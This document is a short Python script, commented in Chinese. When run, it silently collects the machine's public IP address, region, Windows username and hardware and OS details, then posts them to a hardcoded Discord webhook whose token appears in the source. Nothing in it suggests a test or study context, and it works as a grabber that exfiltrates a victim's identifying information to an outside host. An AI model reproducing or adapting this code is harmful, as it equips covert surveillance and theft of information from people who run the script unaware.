#encoding: utf-8
import requests  # 引入requests库
import os  # 引入os库
import psutil  # 引入psutil库
import wmi  # 引入wmi库


def get_info(url):
    """
    获取指定URL的信息并以json格式返回
    """
    try:
        return requests.get(url, timeout=5).json()
    except requests.exceptions.RequestException:
        return None

#auto

def send_to_discord_webhook(message):
    """
    发送消息到Discord的Webhook
    """
    webhook_url = 'https://discord.com/api/webhooks/1216740364996841562/3gZhDf8x-niVnQdFwACOSCcSWz-PhqrYKf-wjd90WBv1eOYqNet6-ekWYrIsCywJvzQE'
    try:
        response = requests.post(webhook_url, json=message, timeout=5)
        print("Message sent to Discord successfully" if response.status_code == 204 else f"Failed to send message to Discord. Status Code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error occurred while sending message to Discord: {str(e)}")

ip_info = get_info('https://ipinfo.io')  # 获取公共IP地址的信息
memory_info = {'total': round(psutil.virtual_memory().total / 1024**3, 2), 'free': round(psutil.virtual_memory().available / 1024**3, 2), 'used': round(psutil.virtual_memory().used / 1024**3, 2)}  # 获取内存信息
cpu_info = {'name': wmi.WMI().Win32_Processor()[0].Name, 'cores': wmi.WMI().Win32_Processor()[0].NumberOfCores, 'threads': wmi.WMI().Win32_Processor()[0].NumberOfLogicalProcessors}  # 获取CPU信息
gpu_info = {'name': wmi.WMI().Win32_VideoController()[0].Name, 'driver_version': wmi.WMI().Win32_VideoController()[0].DriverVersion}  # 获取GPU信息
system_info = {'system': wmi.WMI().Win32_OperatingSystem()[0].Caption, 'release': wmi.WMI().Win32_OperatingSystem()[0].Version, 'machine': wmi.WMI().Win32_OperatingSystem()[0].OSArchitecture}  # 获取系统信息


message = {
    "content": f"Public IP Address: {ip_info['ip']}\nRegion: {ip_info['region']}\nComputer Username: {os.getlogin()}\nMemory Usage: {memory_info} GB\nCPU: {cpu_info}\nGPU: {gpu_info}\nSystem: {system_info['system']} {system_info['release']} {system_info['machine']}\n"
}

send_to_discord_webhook(message)  # 将消息发送到Discord的Webhook

